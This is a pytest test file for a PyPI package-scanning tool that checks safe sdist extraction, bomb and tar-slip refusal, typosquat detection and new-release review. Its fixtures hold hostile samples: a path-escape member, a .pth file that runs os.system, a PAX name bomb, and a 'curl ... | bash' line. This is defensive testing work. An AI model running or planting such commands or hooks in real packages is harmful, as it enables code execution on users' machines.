import dataclasses
import gzip, hashlib, tarfile
from pydiffwatch import fetcher
from pydiffwatch.config import Config
from pydiffwatch.models import NewRelease
from tests.fixtures.build_fixtures import make_sdist, make_raw_member
import pytest


def _meta(pkg, versions):
    """Build a synthetic PyPI package-JSON. versions: list of (ver, iso_ts[, has_sdist[, yanked]])."""
    releases = {}
    for spec in versions:
        ver, ts = spec[0], spec[1]
        has_sdist = spec[2] if len(spec) > 2 else True
        yanked = spec[3] if len(spec) > 3 else False
        releases[ver] = ([{"packagetype": "sdist", "url": f"mock://{pkg}/{ver}",
                           "upload_time_iso_8601": ts, "yanked": yanked}] if has_sdist else
                         [{"packagetype": "bdist_wheel", "url": f"mock://{pkg}/{ver}.whl",
                           "upload_time_iso_8601": ts}])
    return {"releases": releases}

def test_extracts_source_only():
    blob = make_sdist({"setup.py": b"import os\n", "mod/__init__.py": b"x=1\n",
                       "ext.so": b"\x00\x01\x02"})
    files, binaries = fetcher.extract_sdist(blob, Config())
    assert "setup.py" in files and "mod/__init__.py" in files
    assert "ext.so" not in files
    assert any(b["path"] == "ext.so" and "sha256" in b for b in binaries)

def test_tar_slip_rejected():
    blob = make_raw_member("../evil.py", b"x=1\n")
    files, _ = fetcher.extract_sdist(blob, Config())
    assert files == {}   # path-escape member ignored, nothing written anywhere

_CAP = 1024 * 1024          # max_member_bytes in these tests


def _cfg():
    return Config(max_member_bytes=_CAP)


def test_oversized_data_file_is_skipped_and_hashed_not_refused():
    big = b"\x00data" * (_CAP // 5 + 10)                    # > 1 MiB, not source/binary/foreign
    blob = make_sdist({"data/model.bin.gz": big, "ok.py": b"y=2\n"})
    files, binaries = fetcher.extract_sdist(blob, _cfg())
    assert files == {"ok.py": b"y=2\n"}
    assert binaries == [{"path": "data/model.bin.gz", "size": len(big), "reason": "file-too-large",
                         "sha256": hashlib.sha256(big).hexdigest()}]


def test_member_exactly_at_the_cap_is_not_oversized():
    blob = make_sdist({"data/exact.dat": b"a" * _CAP})
    assert fetcher.extract_sdist(blob, _cfg()) == ({}, [])


def test_oversized_py_is_source_too_large_case_insensitive():
    big = b"x = 1\n" * (_CAP // 6 + 10)
    for name in ("evil.py", "EVIL.PY"):
        files, binaries = fetcher.extract_sdist(make_sdist({name: big}), _cfg())
        assert files == {}
        [rec] = binaries
        assert rec["path"] == name and rec["reason"] == "source-too-large"
        assert rec["sha256"] == hashlib.sha256(big).hexdigest()


def test_oversized_so_is_streamed_never_read_whole(monkeypatch):
    big = b"\x7fELF" + b"\x00" * (2 * _CAP)
    blob = make_sdist({"pkg/LIB.SO": big})
    sizes = []
    real = tarfile.TarFile.extractfile

    def spy(self, member):
        f = real(self, member)
        orig = f.read
        def read(size=-1):
            sizes.append(size)
            return orig(size)
        f.read = read
        return f
    monkeypatch.setattr(tarfile.TarFile, "extractfile", spy)
    files, binaries = fetcher.extract_sdist(blob, _cfg())
    assert binaries == [{"path": "pkg/LIB.SO", "sha256": hashlib.sha256(big).hexdigest(), "size": len(big)}]
    assert sizes and all(0 < s <= 1 << 20 for s in sizes)       # every read is chunked, none unbounded


def test_oversized_php_keeps_foreign_language_source():
    big = b"<?php echo 1; ?>\n" * (_CAP // 17 + 10)
    [rec] = fetcher.extract_sdist(make_sdist({"web/x.php": big}), _cfg())[1]
    assert rec["reason"] == "foreign-language-source" and rec["ext"] == ".php"


def test_skipped_members_still_count_toward_total_size():
    big = b"\x00" * (_CAP + 1)
    blob = make_sdist({"a.dat": big, "b.dat": big})
    with pytest.raises(fetcher.RefusedToExtract, match="total-size"):
        fetcher.extract_sdist(blob, Config(max_member_bytes=_CAP, max_total_bytes=2 * _CAP))


@pytest.mark.parametrize("blob", [b"this is not a gzip tarball", gzip.compress(b"garbage, not a tar"), b""])
def test_unreadable_blob_raises_the_stdlib_error_not_a_refusal(blob):
    with pytest.raises(Exception) as ei:
        fetcher.extract_sdist(blob, Config())
    assert not isinstance(ei.value, fetcher.RefusedToExtract)
    assert isinstance(ei.value, (gzip.BadGzipFile, tarfile.ReadError, EOFError, OSError))


def test_truncated_gzip_raises_and_returns_nothing_partial():
    blob = make_sdist({f"m/f{i}.py": (f"x{i} = {i}\n" * 4000).encode() for i in range(20)})
    with pytest.raises((EOFError, tarfile.ReadError)):
        fetcher.extract_sdist(blob[: len(blob) * 6 // 10], Config())


@pytest.mark.parametrize("sig", [b"PK\x03\x04", b"PK\x05\x06", b"PK\x07\x08"])
def test_zip_blob_is_refused_as_zip_sdist(sig):
    with pytest.raises(fetcher.RefusedToExtract, match="^zip-sdist$"):
        fetcher.extract_sdist(sig + b"\x00" * 64, Config())


def test_oversized_source_recorded_not_dropped():
    big_py = b"# pad\n" + b"x = 1  # filler\n" * 200000   # > 1 MB
    blob = make_sdist({"evil.py": big_py, "ok.py": b"y=2\n"})
    files, binaries = fetcher.extract_sdist(blob, Config())
    assert "ok.py" in files
    assert "evil.py" not in files                      # too big to analyze...
    rec = next(b for b in binaries if b["path"] == "evil.py")
    assert rec["reason"] == "source-too-large"         # ...but recorded as a signal

def _pax_name_bomb(name_bytes: int) -> bytes:
    # A 0-byte file whose NAME is huge: gzips tiny (repetitive), but tarfile must materialise the
    # full PAX 'path' record to parse the header. Defeats every m.size-based cap.
    import io, tarfile
    name = "d/" + "a" * name_bytes
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz", format=tarfile.PAX_FORMAT) as t:
        ti = tarfile.TarInfo(name); ti.size = 0
        t.addfile(ti, io.BytesIO(b""))
    return buf.getvalue()

def test_name_bomb_refused_by_decompressed_ceiling():
    # A multi-MB name exceeding the decompressed ceiling must be refused, not materialised in RAM.
    blob = _pax_name_bomb(8 * 1024 * 1024)        # 8 MB name -> trips a 4 MB ceiling mid-read
    assert len(blob) < 1024 * 1024                # ...yet the gzipped blob is tiny
    with pytest.raises(fetcher.RefusedToExtract):
        fetcher.extract_sdist(blob, Config(max_decompressed_bytes=4 * 1024 * 1024))

def test_long_member_name_refused_by_name_cap():
    # A name over max_name_bytes but under the decompressed ceiling is caught by the name guard.
    blob = _pax_name_bomb(5000)                   # 5000-byte name > max_name_bytes(4096)
    with pytest.raises(fetcher.RefusedToExtract):
        fetcher.extract_sdist(blob, Config())     # default 120 MB ceiling does not fire; name cap does

def test_decompressed_ceiling_bounds_total_stream():
    # Total decompressed bytes over the ceiling are refused even when every per-member cap is met.
    members = {f"f{i}.txt": b"x" * (900 * 1024) for i in range(8)}   # 8 x ~0.9MB = ~7MB decompressed
    blob = make_sdist(members)
    with pytest.raises(fetcher.RefusedToExtract):
        fetcher.extract_sdist(blob, Config(max_decompressed_bytes=2 * 1024 * 1024))


# ---- foreign-language-code anomaly: non-Python source in a pip sdist ----

def test_foreign_source_recorded():
    blob = make_sdist({"setup.py": b"from setuptools import setup\n",
                       "app/login.php": b"<?php echo 'hi'; ?>", "pkg/__init__.py": b"x=1\n"})
    files, binaries = fetcher.extract_sdist(blob, Config())
    assert "setup.py" in files and "pkg/__init__.py" in files     # python still extracted
    assert "app/login.php" not in files                            # foreign source never parsed/analyzed
    rec = next(b for b in binaries if b["path"] == "app/login.php")
    assert rec["reason"] == "foreign-language-source" and rec["ext"] == ".php"
    assert "sha256" in rec                                         # fingerprinted, so unchanged reposts don't re-fire

def test_legitimate_cext_and_assets_not_foreign():
    blob = make_sdist({"setup.py": b"x=1\n", "_speedups.c": b"int main(){}\n",
                       "src/parser.pyx": b"def f(): pass\n", "vendor/jquery.js": b"//js\n",
                       "scripts/build.sh": b"#!/bin/sh\n", "conf/app.yaml": b"a: 1\n"})
    _, binaries = fetcher.extract_sdist(blob, Config())
    assert not any(b.get("reason") == "foreign-language-source" for b in binaries)

def test_foreign_case_insensitive_and_double_extension():
    blob = make_sdist({"setup.py": b"x=1\n", "A.PHP": b"<?php ?>", "setup.py.php": b"<?php ?>"})
    _, binaries = fetcher.extract_sdist(blob, Config())
    foreign = {b["path"] for b in binaries if b.get("reason") == "foreign-language-source"}
    assert foreign == {"A.PHP", "setup.py.php"}

def test_foreign_per_package_cap():
    # Extraction hashes every foreign file (so unchanged ones can be dropped vs the prior release); the cap
    # applies afterwards, to what is reported (tests/test_unchanged_binaries.py).
    members = {"setup.py": b"x=1\n"} | {f"x{i}.php": b"<?php ?>" for i in range(30)}
    blob = make_sdist(members)
    _, binaries = fetcher.extract_sdist(blob, Config(max_foreign_files=25))
    assert sum(1 for b in binaries if b.get("reason") == "foreign-language-source") == 30
    capped = fetcher._cap_foreign(binaries, Config(max_foreign_files=25))
    assert sum(1 for b in capped if b.get("reason") == "foreign-language-source") == 25


# ---- fetch_artifacts: PyPI-baseline resolution + new-package policy ----

def test_update_diffs_against_pypi_predecessor(monkeypatch):
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("acme", [
        ("1.0", "2026-01-01T00:00:00Z"), ("1.1", "2026-02-01T00:00:00Z")]))
    blobs = {"mock://acme/1.0": make_sdist({"acme/__init__.py": b"x = 1\n"}),
             "mock://acme/1.1": make_sdist({"acme/__init__.py": b"x = 2\n"})}
    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: blobs[url])
    art = fetcher.fetch_artifacts(Config(), NewRelease("acme", "1.1", 5))
    assert art.is_new_package is False
    assert art.prior_version == "1.0"                      # baseline came from PyPI, not our DB
    assert art.prior_files["acme/__init__.py"] == b"x = 1\n"
    assert art.new_files["acme/__init__.py"] == b"x = 2\n"


def test_new_package_scans_surface_only(monkeypatch):
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("brandnew", [
        ("1.0", "2026-01-01T00:00:00Z")]))                # single version => genuinely new package
    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: make_sdist({
        "setup.py": b"import os\nos.system('x')\n",
        "brandnew/__init__.py": b"import requests\n",
        "brandnew/big_model.py": b"# bulk library code\n" * 5000}))
    art = fetcher.fetch_artifacts(Config(), NewRelease("brandnew", "1.0", 5))   # default policy=surface
    assert art.is_new_package is True and art.prior_version is None
    assert set(art.new_files) == {"setup.py", "brandnew/__init__.py"}   # bulk module dropped, no truncation


def test_new_package_skip_policy_downloads_nothing(monkeypatch):
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("np", [("1.0", "2026-01-01T00:00:00Z")]))
    calls = {"n": 0}
    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: calls.__setitem__("n", calls["n"] + 1) or b"")
    art = fetcher.fetch_artifacts(dataclasses.replace(Config(), new_package_policy="skip"),
                                  NewRelease("np", "1.0", 5))
    assert art.is_new_package is True and art.new_files == {}
    assert calls["n"] == 0                                 # skip policy never downloads the sdist


def test_predecessor_ignores_yanked_and_wheel_only(monkeypatch):
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("acme", [
        ("1.0", "2026-01-01T00:00:00Z"),                   # valid predecessor
        ("1.1", "2026-02-01T00:00:00Z", True, True),       # yanked sdist -> not a baseline
        ("1.2", "2026-03-01T00:00:00Z", False),            # wheel-only (no sdist) -> not a baseline
        ("1.3", "2026-04-01T00:00:00Z")]))                 # target
    blobs = {"mock://acme/1.0": make_sdist({"a/__init__.py": b"x = 1\n"}),
             "mock://acme/1.3": make_sdist({"a/__init__.py": b"x = 9\n"})}
    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: blobs[url])
    art = fetcher.fetch_artifacts(Config(), NewRelease("acme", "1.3", 5))
    assert art.prior_version == "1.0"                      # skipped yanked 1.1 and wheel-only 1.2


def test_no_sdist_returns_no_sdist(monkeypatch):
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("wheelpkg", [
        ("1.0", "2026-01-01T00:00:00Z", False)]))          # wheel-only release
    assert fetcher.fetch_artifacts(Config(), NewRelease("wheelpkg", "1.0", 5)) == fetcher.NoSdist(None)


def test_fetch_captures_maintainer_metadata(monkeypatch):
    meta = _meta("acme", [("1.0", "2026-01-01T00:00:00Z"), ("1.1", "2026-02-01T00:00:00Z")])
    meta["info"] = {"author": "Alice", "author_email": "alice@x.io",
                    "maintainer": "Bob", "maintainer_email": "bob@x.io"}
    meta["ownership"] = {"roles": [{"role": "Owner", "user": "alice"},
                                   {"role": "Maintainer", "user": "bob"}]}
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: meta)
    blobs = {"mock://acme/1.0": make_sdist({"acme/__init__.py": b"x=1\n"}),
             "mock://acme/1.1": make_sdist({"acme/__init__.py": b"x=2\n"})}
    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: blobs[url])
    art = fetcher.fetch_artifacts(Config(), NewRelease("acme", "1.1", 9))
    assert art.maintainer_metadata == {"author": "Alice", "maintainer": "Bob",
                                       "roles": ["alice", "bob"], "upload_time": "2026-02-01T00:00:00Z"}
    assert "author_email" not in art.maintainer_metadata        # PII deliberately omitted
    assert "maintainer_email" not in art.maintainer_metadata


# ---- signal 5: added-dependency reputation screening (requires_dist diff) ----

def test_fetch_screens_added_dependencies(monkeypatch):
    from datetime import datetime, timezone, timedelta
    meta = _meta("acme", [("1.0", "2026-01-01T00:00:00Z"), ("1.1", "2026-02-01T00:00:00Z")])
    meta["info"] = {"requires_dist": ["requests", "reqursts", "freshpkg"]}   # new version's declared deps
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: meta)
    monkeypatch.setattr(fetcher, "_requires_dist", lambda pkg, ver, cfg: ["requests"])  # 1.0 had only requests
    fresh_ts = (datetime.now(timezone.utc) - timedelta(days=2)).isoformat()
    monkeypatch.setattr(fetcher, "_dep_json",
                        lambda name, cfg: {"releases": {"1.0": [{"upload_time_iso_8601": fresh_ts}]}})
    blobs = {"mock://acme/1.0": make_sdist({"acme/__init__.py": b"x=1\n"}),
             "mock://acme/1.1": make_sdist({"acme/__init__.py": b"x=2\n"})}
    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: blobs[url])
    art = fetcher.fetch_artifacts(Config(), NewRelease("acme", "1.1", 9))
    reasons = {f["name"]: f["reason"] for f in art.added_dep_findings}
    assert reasons.get("reqursts") == "typosquat"      # added + close to 'requests', decided locally
    assert reasons.get("freshpkg") == "brand-new"      # added + first published 2 days ago
    assert "requests" not in reasons                   # popular -> whitelisted, not flagged


def test_fetch_no_dep_findings_when_new_version_declares_none(monkeypatch):
    # The common case: no info.requires_dist -> empty added set -> no screening, no extra network.
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("acme", [
        ("1.0", "2026-01-01T00:00:00Z"), ("1.1", "2026-02-01T00:00:00Z")]))
    blobs = {"mock://acme/1.0": make_sdist({"acme/__init__.py": b"x=1\n"}),
             "mock://acme/1.1": make_sdist({"acme/__init__.py": b"x=2\n"})}
    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: blobs[url])
    art = fetcher.fetch_artifacts(Config(), NewRelease("acme", "1.1", 9))
    assert art.added_dep_findings == []


def test_extracts_pth_and_entry_points_and_top_level():
    blob = make_sdist({"setup.py": b"import os\n",
                       "evil.pth": b"import os;os.system('id')\n",
                       "pkg.egg-info/entry_points.txt": b"[console_scripts]\nfoo=pkg:main\n",
                       "pkg.egg-info/top_level.txt": b"pkg\n"})
    files, _ = fetcher.extract_sdist(blob, Config())
    assert "evil.pth" in files
    assert "pkg.egg-info/entry_points.txt" in files
    assert "pkg.egg-info/top_level.txt" in files


def test_new_package_surface_keeps_the_metadata_the_execution_context_reads(monkeypatch):
    # The block must not tell the reviewer "commands: none" for a first release whose egg-info lists them.
    from pydiffwatch import differ
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("brandnew", [
        ("1.0", "2026-01-01T00:00:00Z")]))
    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: make_sdist({
        "setup.py": b"from setuptools import setup\nsetup()\n",
        "PKG-INFO": b"Metadata-Version: 2.1\nName: brandnew\n",
        "brandnew/__init__.py": b"",
        "brandnew/cli.py": b"def main(): pass\n",
        "brandnew.egg-info/entry_points.txt": b"[console_scripts]\nbn = brandnew.cli:main\n\n[pytest11]\nbn = brandnew.plug\n",
        "brandnew.egg-info/top_level.txt": b"brandnew\n",
        "brandnew.egg-info/SOURCES.txt": b"x\n",
        "vendor/other.egg-info/entry_points.txt": b"[console_scripts]\nv = v:main\n"}))
    art = fetcher.fetch_artifacts(Config(), NewRelease("brandnew", "1.0", 5))   # default policy=surface
    assert set(art.new_files) == {"setup.py", "brandnew/__init__.py",           # no PKG-INFO: nothing reads it
                                  "brandnew.egg-info/entry_points.txt", "brandnew.egg-info/top_level.txt"}
    ctx = differ.build_diff(art).exec_context
    assert "bn -> brandnew.cli:main" in ctx and "pytest11: bn -> brandnew.plug" in ctx
    assert "top_level.txt=brandnew" in ctx


def test_a_large_pkg_info_never_crowds_setup_py_out_of_a_first_release_review(monkeypatch):
    # PKG-INFO's body is the whole README (up to ~1 MB), in two copies; the block never reads it, and it sorts
    # before setup.py / pyproject.toml, so it must stay out of the surface or it cuts them from the input.
    from pydiffwatch import differ, reviewer
    from pydiffwatch.models import TriageResult
    pkginfo = (b"Metadata-Version: 2.1\nName: brandnew\n\n# brandnew\ncurl -sSL https://example.invalid/i.sh | bash\n"
               + (b"x" * 150 + b"\n") * 1200)
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("brandnew", [
        ("1.0", "2026-01-01T00:00:00Z")]))
    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: make_sdist({
        "PKG-INFO": pkginfo, "brandnew.egg-info/PKG-INFO": pkginfo,
        "setup.py": b"from setuptools import setup\nsetup(name='brandnew')\n",
        "pyproject.toml": b"[build-system]\nrequires=['setuptools']\nbuild-backend='setuptools.build_meta'\n",
        "brandnew/__init__.py": b"__version__ = '1.0'\n"}))
    art = fetcher.fetch_artifacts(Config(), NewRelease("brandnew", "1.0", 5))
    text = reviewer.build_review_input(differ.build_diff(art), TriageResult(50.0, [], True),
                                       max_chars=Config().reviewer.max_input_chars)
    lines = text.split("\n")
    assert "--- file: setup.py (added) ---" in lines and "--- file: pyproject.toml (added) ---" in lines
    assert "PKG-INFO" not in text and "curl -sSL" not in text


def _oversized_setup():
    return (b"from setuptools import setup\nsetup(entry_points={'pytest11': ['p = evil:hook']})\n"
            + b"# pad\n" * 200_000)                                             # > 1 MiB max_source_file_bytes


@pytest.mark.parametrize("prior_has_it", [False, True])
def test_an_oversized_setup_py_is_unknown_in_the_block_never_absent(monkeypatch, prior_has_it):
    # Padding setup.py past the source cap must not turn "runs at build, declares pytest11" into "absent, none",
    # including on an update where the same oversized setup.py was already in the prior sdist.
    from pydiffwatch import differ
    big = _oversized_setup()
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("acme", [
        ("1.0", "2026-01-01T00:00:00Z"), ("1.1", "2026-01-02T00:00:00Z")]))
    blobs = {"mock://acme/1.0": make_sdist({"acme/__init__.py": b"x = 1\n", **({"setup.py": big} if prior_has_it else {})}),
             "mock://acme/1.1": make_sdist({"acme/__init__.py": b"x = 2\n", "setup.py": big})}
    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: blobs[url])
    monkeypatch.setattr(fetcher, "_screen_added_deps", lambda *a, **k: [])
    art = fetcher.fetch_artifacts(Config(), NewRelease("acme", "1.1", 5))
    assert "setup.py" not in art.new_files and art.too_large == ("setup.py",)
    ctx = differ.build_diff(art).exec_context
    assert "setup.py=unknown (too large to scan)" in ctx and "absent" not in ctx
    assert "plugins" in ctx and "unknown (setup.py too large)" in ctx


def test_oversized_pth_and_egg_info_entry_points_are_unknown_in_the_block(monkeypatch):
    from pydiffwatch import differ
    pad = b"# pad\n" * 200_000                                                        # > 1 MiB max_source_file_bytes
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("acme", [
        ("1.0", "2026-01-01T00:00:00Z"), ("1.1", "2026-01-02T00:00:00Z")]))
    blobs = {"mock://acme/1.0": make_sdist({"acme/__init__.py": b"x = 1\n"}),
             "mock://acme/1.1": make_sdist({"acme/__init__.py": b"x = 2\n", "evil.pth": b"import os\n" + pad,
                                            "acme.egg-info/entry_points.txt": b"[pytest11]\np = evil:hook\n" + pad})}
    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: blobs[url])
    monkeypatch.setattr(fetcher, "_screen_added_deps", lambda *a, **k: [])
    art = fetcher.fetch_artifacts(Config(), NewRelease("acme", "1.1", 5))
    ctx = differ.build_diff(art).exec_context
    assert "unknown (evil.pth too large to scan)" in ctx
    assert "unknown (acme.egg-info/entry_points.txt too large)" in ctx


@pytest.mark.parametrize("ep", [b"[pytest11]\np = e:h\n", b"#\n" * 600_000])      # small, and > 1 MiB
def test_a_top_level_entry_points_txt_never_breaks_build_diff(ep):
    from pydiffwatch import differ
    from pydiffwatch.models import ArtifactSet
    nf, bins = fetcher.extract_sdist(make_sdist({"acme/__init__.py": b"x = 2\n", "entry_points.txt": ep}), Config())
    too_large = tuple(b["path"] for b in bins if b.get("reason") == "source-too-large")
    d = differ.build_diff(ArtifactSet("acme", "1.1", "1.0", "sdist", nf, {}, {}, [], too_large=too_large))
    assert "plugins" in d.exec_context


def test_a_first_flit_release_keeps_its_top_level_entry_points_txt(monkeypatch):
    # old-style flit reads entry_points.txt at the sdist root; the surface filter must not turn it into "none"
    from pydiffwatch import differ
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("brandnew", [("1.0", "2026-01-01T00:00:00Z")]))
    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: make_sdist({
        "pyproject.toml": b"[build-system]\nbuild-backend = 'flit_core.buildapi'\n[tool.flit.metadata]\nmodule = 'a'\n",
        "a/__init__.py": b"", "entry_points.txt": b"[pytest11]\np = evil:hook\n"}))
    art = fetcher.fetch_artifacts(Config(), NewRelease("brandnew", "1.0", 5))   # default policy=surface
    assert "entry_points.txt" in art.new_files
    assert "pytest11: p -> evil:hook" in differ.build_diff(art).exec_context


# ---- C1: download / extract_download ----

def test_download_parses_no_archive_and_carries_the_blobs(monkeypatch):
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("acme", [
        ("1.0", "2026-01-01T00:00:00Z"), ("1.1", "2026-02-01T00:00:00Z")]))
    blobs = {"mock://acme/1.0": b"PRIOR", "mock://acme/1.1": b"NEW"}      # not tarballs: never opened
    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: blobs[url])
    monkeypatch.setattr(fetcher, "_screen_added_deps", lambda *a, **k: [{"name": "x", "reason": "brand-new"}])
    monkeypatch.setattr(fetcher, "extract_sdist", lambda *a: (_ for _ in ()).throw(AssertionError("parsed")))
    dl = fetcher.download(Config(), NewRelease("acme", "1.1", 5))
    assert (dl.new_blob, dl.prior_blob, dl.prior_version, dl.is_new_package) == (b"NEW", b"PRIOR", "1.0", False)
    assert dl.added_dep_findings == [{"name": "x", "reason": "brand-new"}] and dl.prior_error is None


def test_download_under_skip_downloads_nothing(monkeypatch):
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("brandnew", [("1.0", "2026-01-01T00:00:00Z")]))
    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: (_ for _ in ()).throw(AssertionError("downloaded")))
    dl = fetcher.download(Config(new_package_policy="skip"), NewRelease("brandnew", "1.0", 5))
    assert dl.new_blob is None and dl.is_new_package is True
    art = fetcher.extract_download(Config(new_package_policy="skip"), dl)
    assert art.new_files == {} and art.is_new_package is True


def test_a_prior_download_failure_is_a_download_field(monkeypatch):
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("acme", [
        ("1.0", "2026-01-01T00:00:00Z"), ("1.1", "2026-02-01T00:00:00Z")]))

    def dl_(url, cfg):
        if url.endswith("/1.0"):
            raise TimeoutError("hung")
        return make_sdist({"acme/__init__.py": b"x = 2\n"})
    monkeypatch.setattr(fetcher, "_download", dl_)
    monkeypatch.setattr(fetcher, "_screen_added_deps", lambda *a, **k: [])
    dl = fetcher.download(Config(), NewRelease("acme", "1.1", 5))
    assert dl.prior_blob is None
    assert dl.prior_error == "prior 1.0 sdist unavailable (TimeoutError: hung); diffed against nothing"
    assert fetcher.extract_download(Config(), dl).prior_error == dl.prior_error


def test_a_prior_that_is_itself_a_bomb_is_a_prior_error_not_a_refusal(monkeypatch):
    # Review Focus 2: only the NEW sdist's refusal refuses the release
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("acme", [
        ("1.0", "2026-01-01T00:00:00Z"), ("1.1", "2026-02-01T00:00:00Z")]))
    many = {f"acme/m{i}.py": b"" for i in range(5)}
    blobs = {"mock://acme/1.0": make_sdist(many), "mock://acme/1.1": make_sdist({"acme/__init__.py": b"x = 2\n"})}
    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: blobs[url])
    monkeypatch.setattr(fetcher, "_screen_added_deps", lambda *a, **k: [])
    cfg = Config(max_members=3)
    art = fetcher.extract_download(cfg, fetcher.download(cfg, NewRelease("acme", "1.1", 5)))
    assert art.prior_error == "prior 1.0 sdist unavailable (RefusedToExtract: members); diffed against nothing"
    assert art.prior_files == {} and "acme/__init__.py" in art.new_files


def test_a_refusing_new_sdist_raises_from_extract_download_not_download(monkeypatch):
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("acme", [
        ("1.0", "2026-01-01T00:00:00Z"), ("1.1", "2026-02-01T00:00:00Z")]))
    many = {f"acme/m{i}.py": b"" for i in range(5)}
    blobs = {"mock://acme/1.0": make_sdist({"acme/__init__.py": b"x = 1\n"}), "mock://acme/1.1": make_sdist(many)}
    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: blobs[url])
    monkeypatch.setattr(fetcher, "_screen_added_deps", lambda *a, **k: [])
    cfg = Config(max_members=3)
    dl = fetcher.download(cfg, NewRelease("acme", "1.1", 5))         # no refusal here
    with pytest.raises(fetcher.RefusedToExtract, match="members"):
        fetcher.extract_download(cfg, dl)
